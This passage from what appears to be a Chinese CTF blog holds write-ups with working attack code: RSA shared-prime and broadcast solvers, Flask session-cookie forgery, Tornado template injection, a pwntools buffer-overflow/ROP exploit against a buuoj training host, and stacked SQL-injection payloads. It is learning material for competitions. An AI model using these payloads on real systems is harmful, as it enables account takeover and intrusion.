15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357 n = 21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369c = 20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932 n = 25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137c = 19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179 n = 22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191c = 6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006 n = 23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941c = 5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934 n = 28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491c = 9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869 n = 22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019c = 1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467 n = 27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299c = 21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971 n = 20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551c = 14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175 n = 27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987c = 3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457 n = 27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837c = 14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842 n = 25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451c = 17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724 n = 23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499c = 10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024 n = 19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973c = 3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887 n = 19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603c = 6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889 n = 26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659c = 386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346 这是典型的多模数题目，即用同样的公钥加密同样的消息，只是私钥一直在变换 所以这就是一个简单的RSA共享素数攻击，在生成p和q的时候，难免会有2个n共享1个素数 所以我们用gcd遍历n，即可分解出p和q,进而解出m 123456789101112131415161718192021222324252627import libnumimport gmpy2import primefacfrom Crypto.Util.number import long_to_bytesf = open('/Users/miao/Downloads/1.txt', 'rb')txt_content = f.readlines()[3:]n = []c = []e = 65537for i in txt_content: if 'n' in i: n.append(int(i[4:].replace('\\n', ''))) elif 'c' in i: c.append(int(i[4:].replace('\\n', '')))for i in range(0, 19): for j in range(i + 1, 20): if primefac.gcd(n[i], n[j]) != 1: now_n = n[i] now_c = c[i] p = primefac.gcd(n[i], n[j]) q = now_n / p phi = (p - 1) * (q - 1) d = gmpy2.invert(e, phi) print long_to_bytes(pow(now_c, d, now_n)) # print libnum.n2s(pow(now_c, d, now_n)) 给出几组N和c，求m N = 331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004ccc = 10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242 低指数广播攻击， 即用相同的公钥加密相同的消息，但每一组的n不同，e是一个很小的数，例如3或者10 这个题目给出的是5进制数字，需要先处理一下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import gmpy2import gmpyimport libnumfrom Crypto.Util.number import long_to_bytesn1 = 331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004c1 = 310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243n2 = 302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114c2 = 112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344n3 = 332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323c3 = 10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242def boradcast_fuzz(question, e): N = 1 for i in range(len(question)): N *= question[i]['n'] N_list = [] for i in range(len(question)): N_list.append(N / question[i]['n']) t_list = [] for i in range(len(question)): t_list.append(int(gmpy2.invert(N_list[i], question[i]['n']))) sum = 0 for i in range(len(question)): sum = (sum + question[i]['c'] * t_list[i] * N_list[i]) % N sum = gmpy.root(sum, e)[0] # return libnum.n2s(sum) return long_to_bytes(sum)n1 = int(str(n1), 5)n2 = int(str(n2), 5)n3 = int(str(n3), 5)c1 = int(str(c1), 5)c2 = int(str(c2), 5)c3 = int(str(c3), 5)question = [ &#123;'n': n1, 'c': c1&#125;, &#123;'n': n2, 'c': c2&#125;, &#123;'n': n3, 'c': c3&#125;,]for i in range(2, 20): res = boradcast_fuzz(question, i) if 'noxCTF' in res: print res print 'e=%d' % (i) break","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"}]},{"title":"[HCTF 2018] admin","slug":"HCTF-2018-admin","date":"2019-11-04T07:15:11.000Z","updated":"2019-11-04T07:15:53.775Z","comments":true,"path":"2019/11/04/HCTF-2018-admin/","link":"","permalink":"https://darkwing.moe/2019/11/04/HCTF-2018-admin/","excerpt":"","text":"基本信息进去就是login，register，源码里有一句注释 1&lt;!-- you are not admin --&gt; 随意注册账号登录进去，有一个change password选项，change页面注释github泄漏： https://github.com/woadsl1234/hctf_flask/ session 伪造因为题目要求admin，源码也可以看到需要session[&#39;name&#39;] == &#39;admin&#39;后会在页面显示flag，根据p师傅之前的文章： https://www.leavesongs.com/PENETRATION/client-session-security.html flask的session都是在本地的，通过一个SECRET_KEY进行签名,可以直接使用脚本进行操作： https://github.com/noraj/flask-session-cookie-manager 12$ python3 flask_session_manager.py decode -c .eJw9kE2LwjAURf_KkLWLfm4EFx1SSwvvlZZ0QrIRR6s16XOgrUyN-N-nOOD6cs_l3AfbnYZ27Nh6Gm7tiu0uR7Z-sI9vtmYQqBllc1fuEIKrqRRHg6boFKUxEIQgVKg5WhRFB1l-1yYJQeYOeR6poLbKJV7JP0m53NNi2wOlDmTqA1UORBVCVsWaa4u8viBPfCW_CAPsNaU-Ghsp0fXgDg7dOUZSQSlhRpPMWhytzhofTGGR8jtksGHPFTuMw2k3_dj2-lYoeROBaH6XWoym7kAiaYJZma1VAnsI9KKTx1qcI5DFMlJ3WG1euAvtz-2bJAIUZfKfXPe0BGxqx4mt2G1sh9dtzPfY8w9gTmvt.Xb_HBg.KuktGfJY6uvuJvIBeqzZF6Bk5CUb'&#123;\"_fresh\":true,\"_id\":&#123;\" b\":\"M2YxNWUyYzc3MzRmOTdjNjJhYmE5MmM3MTY3ZDNkNTJhMGIyZjA3MWIzNDI4Y2RkYzA0ODBmYzI0ZTFlMmEzMWE1MmQzMTQ3MGQ5ZDZkNDRiNDA1YWVmN2NlZmE1Njk4YThlMzczNzg5NmY2OWMxNjAxZTdkZGU1MjJkNmIyMGM=\"&#125;,\"csrf_token\":&#123;\" b\":\"ODU4MTUwNjA5NjRhMWNmZmMxYjFkYTNlM2ZhYmI5ZTg4MWJmY2RhNQ==\"&#125;,\"image\":&#123;\" b\":\"T2NTOA==\"&#125;,\"name\":\"test\",\"user_id\":\"10\"&#125;' 可以看到原有的session中name为test，可以尝试将其修改为admin后重新签名，github源码中也有 1SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123' 那么就直接尝试使用ckj123作为KEY 12$ python3 flask_session_manager.py encode -t \"&#123;'_fresh': True, '_id': b'ca73d01f58fe172c279fdb1026ba1202390ee0e60b049380c8785511afd9560104b61fa487c4bcb293fc463ef1548d3cad028ce1b5ff4922ab5246e4105a0a33', 'csrf_token': b'bcb966803bad1e8b020d5b7cf5e843fb157ef072', 'image': b'Av32', 'name': 'admin', 'user_id': '10'&#125;\" -s ckj123 .eJxFkE9rwkAUxL9KeWcP-aMXwUNko6TwdllYm769iDUxyUvWQlRiVvzuDULbw8DAwG-YecD-1JeXGpbX_lbOYN8UsHzA2xcsgaI0xkgPmFOotrZDcxzJZ7HKbUucDsi2IZOOKDKvzLqzkySvGxR6gb4ayFexErsQzaa2Ti-koQFNEhDT3bo0UKJguX1n4myBkWUpyNuc7tLouRWSKZ-6uWZrNo3MrZOiHdFN3mSBdLtgYoVk1jV6XMFzBsdLf9pfv9vy_D_ByUYZipRIPLlNi_luTpyMuNUhccGWPzoltLcum2qLznISY7V64Rp3qMo_kv4k_5ucD24K4FC45gwzuF3K_vUbhAE8fwBi-m2U.Xb_MEw._H8R8AAmbOCT1jQg8JQnP7W7Qmo Unicode欺骗这个应该是预期解 源码中显示，各种操作前都会对用户名进行自定义的strlower 123def strlower(username): username = nodeprep.prepare(username) return username nodeprep.prepare对应的库是 https://github.com/twisted/twisted requirements.txt中显示Twisted==10.2.0 版本非常老，明显有问题 根据这篇文章 https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e unicode问题，对于一些特殊字符，nodeprep.prepare会进行如下操作 1ᴬ -&gt; A -&gt; a 即第一次将其转换为大写，第二次将其转换为小写 那么，攻击链大概就这样 注册用户ᴬdmin 登录用户ᴬdmin，变成Admin 修改密码Admin，更改了admin的密码","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"}]},{"title":"护网杯2018-easy_tornado","slug":"护网杯2018-easy-tornado","date":"2019-10-30T06:02:23.000Z","updated":"2019-10-30T06:03:33.743Z","comments":true,"path":"2019/10/30/护网杯2018-easy-tornado/","link":"","permalink":"https://darkwing.moe/2019/10/30/%E6%8A%A4%E7%BD%91%E6%9D%AF2018-easy-tornado/","excerpt":"","text":"护网杯2018的一道tornado模板注入题目 12345678&#x2F;flag.txtflag in &#x2F;fllllllllllllag&#x2F;welcome.txtrender&#x2F;hints.txtmd5(cookie_secret+md5(filename)) 给出了以上信息，并且url格式是file?filename=/hints.txt&amp;filehash=1665701fc163e54b3bdc373b5e48446d这样的，直接修改filename为flag的话，得到错误信息： 1&#x2F;error?msg&#x3D;Error 并且页面显示Error,直接修改msg页面显示内容也会改变,根据render提示应该是模板注入，但存在过滤，ORZ 在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量 得到secret后，就是计算访问flag文件的hash，获取flag 1234567import hashlibfilename = '/fllllllllllllag'cookie_secret = 'xxxx'file_md5 = hashlib.md5(filename).hexdigest()print file_md5print hashlib.md5(cookie_secret+file_md5).hexdigest()","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"}]},{"title":"buuoj-pwn-rip","slug":"buuoj-pwn-rip","date":"2019-10-29T05:05:36.000Z","updated":"2019-10-29T05:07:28.915Z","comments":true,"path":"2019/10/29/buuoj-pwn-rip/","link":"","permalink":"https://darkwing.moe/2019/10/29/buuoj-pwn-rip/","excerpt":"","text":"题目信息 64位elf，简单输入，保护基本没开 静态分析IDA，明显的溢出，并且直接有一个fun函数来getshell，那就控制rip跳到fun就可以 动态分析gdb简单看一下，offset23，fun地址0x401186 exploit1234567891011121314from pwn import *sh = remote('node3.buuoj.cn', 28896)# sh = process('./pwn1')# context.arch = 'amd64'# context.log_level = 'debug'fun_addr = 0x401186payload = 'A' * 23+ p64(0x401186)sh.sendline(payload)sh.interactive() 另外一种方式，手动构造ROP： 12345678910111213141516171819from pwn import *sh = remote('node3.buuoj.cn', 28225)elf = ELF('./pwn1')context.arch = 'amd64'# context.log_level = 'debug'# fun_addr = 0x401186bin_sh_addr=0x40201Bpop_rdi=0x4011fbpayload = 'A' * 23payload += p64(pop_rdi)payload += p64(bin_sh_addr)payload += p64(elf.symbols[\"system\"])sh.sendline(payload)sh.interactive()","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"CTF学到的两个SQL知识点","slug":"CTF学到的两个SQL知识点","date":"2019-10-25T01:58:50.000Z","updated":"2019-10-25T02:12:21.310Z","comments":true,"path":"2019/10/25/CTF学到的两个SQL知识点/","link":"","permalink":"https://darkwing.moe/2019/10/25/CTF%E5%AD%A6%E5%88%B0%E7%9A%84%E4%B8%A4%E4%B8%AASQL%E7%9F%A5%E8%AF%86%E7%82%B9/","excerpt":"","text":"主要是两道CTF题目的考点，BUUOJ上有 [强网杯 2019]随便注 首先是常规堆叠注入，这个没什么讲的 表名是一串数字，数字串为表名的表操作时要加反引号 主要利用的就是存储过程： 1?inject&#x3D;1&#39;;SeT@a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;# PREPARE语句准备好一条SQL语句，并分配给这条SQL语句一个名字供之后调用。准备好的SQL语句通过EXECUTE命令执行，通过DEALLOCATE PREPARE命令释放掉。 @a变量的16进制值转换一下是： 1select * from `数字串表名` [SUCTF 2019]EasySQL首先堆叠注入 后段sql是这样的： 1select $_GET['query'] || flag from flag 考点： MYSQL一种管道符模式。 可以在MYSQL中开启支持管道符来进行字符串的拼接操作： 1set sql_mode=pipes_as_concat; 这样||会作为字符串连接 payload： 11;set sql_mode=pipes_as_concat;select 1 非预期解法： 1*,1 这样带入sql是： 1select *,1 || flag from flag","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"}]},{"title":"Pwn学习笔记24:其他一些技术","slug":"Pwn学习笔记24-其他一些技术","date":"2019-09-24T07:42:54.000Z","updated":"2019-09-24T07:43:34.142Z","comments":true,"path":"2019/09/24/Pwn学习笔记24-其他一些技术/","link":"","permalink":"https://darkwing.moe/2019/09/24/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B024-%E5%85%B6%E4%BB%96%E4%B8%80%E4%BA%9B%E6%8A%80%E6%9C%AF/","excerpt":"","text":"ucontextsetjmp/longjmp的最终演变 setjmp()/longjmp() sigsetjmp()/siglongjmp() getcontext()/makecontext()/setcontext()/swapcontext() 1. setjmp()/longjmp() 通过setjmp()设置一个保存点，可以通过longjmp()返回到那里 实现了函数间的goto 只要不从setjmp()的函数退出就有效 返回保存点时，esp寄存器会还原到设置保存点时的值。即只返回stack位置，而不是内容。调用setjmp()的函数一旦退出，stack本身可能与保存点设定时不同，即便还原也可能不能正常工作 正常工作的case： esp还原时，stack frame也还原到正常 非正常工作的case： funcA退出，funcC，funcD调用后，funcD内longjmp()，esp还原，这时候stack frame是funcC，不是原本的funcA 2. sigsetjmp()/siglongjmp()也可以恢复signal stack信息 假如存在一个通过sigaction(2)指定signal stack的signal handler（例如SIG_TERM的handler运行中，不接受SIG_ALRM），当这个handler内通过longjmp()返回保存点时，它不接受SIG_ALRM返回。为避免这种情况，需要一种在longjmp()时还原signal stack信息的处理机制 3. getcontext()/makecontext()/setcontext()/swapcontext() 通过getcontext()设置保存点(context) 通过 makecontext()将context与函数相关联 恢复时，可以从关联的函数进行（带参数） 但是需要给context一个独立的stack区域 只在这种情况下，与setjmp()/sigsetjmp()不同，调用getcontext()的函数退出后仍然有效 也可以指定next context 当这个函数结束时，自动转换到next 通过setcontext()来返回到那个context 通过swapcontext()来返回到那个context，并且保存现在的context ucontext 生成context 根据需要修改context中的信息 通过makecontext()，可以修改为通过特定函数带参数调用 可以直接重写context中的寄存器信息 之后通过setcontext()/swapcontext()进行切换 可以通过适当设置，从任意寄存器状况恢复 context的结构 作为参考，context结构大概是这样(Ubuntu x86_64) ss_sp是指向新stack的指针 ss_size是它的size gregs[0~22]是用来保存通用寄存器及其值 从gregs[0]开始按顺序，R8, R9, R10, R11, R12, R13, R14, R15,RDI, RSI, RBP, RBX, RDX, RAX, RCX, RSP, RIP, EFL, CSGSFS(+pad),ERR, TRAPNO, OLDMASK, CR2 __val是signal mask ucontext与sigactioncontext与sigaction也有关联 https://linuxjm.osdn.jp/html/LDP_man-pages/man2/sigaction.2.html 在sa_flags指定SA_SIGINFO时(不是sa_handler)，根据sa_sigaction的signum指定对应的signal handler函数。指定的函数，第一个参数是signal 编号，第二个是指向siginfo_t的指针，第三个参数是经过(void * 类型转换)的指向ucontext_t的指针 只要正确设置，成为signal handler的函数也可以接受context作为第三个参数 ucontext的总结 非常强大的机制 使用时，可以从任意函数/地址启动任意的寄存器状态 利用这个功能，用户可以自己实现类似线程的context切换 但是，context的结构非常复杂 需要注意，没有system call DWARF 之前解释过malloc(-1)的行为 只是失败 new(-1)时，会产生std::bad_alloc 产生异常，需要手动处理 实际上尝试大概是这样 可以使用try-catch来手动处理： 那么try-catch是怎么避免异常进行还原的？ 使用IDA能够看到try catch，但不能确定范围 这是libgcc通过DWARF来确定处理的位置 DWARF 是作为调试信息，保存stack trace的机制 .debug_frame section C++的try-catch实现也使用到 .eh_frame_hdr section，.eh_frame section(CIE, FDE) 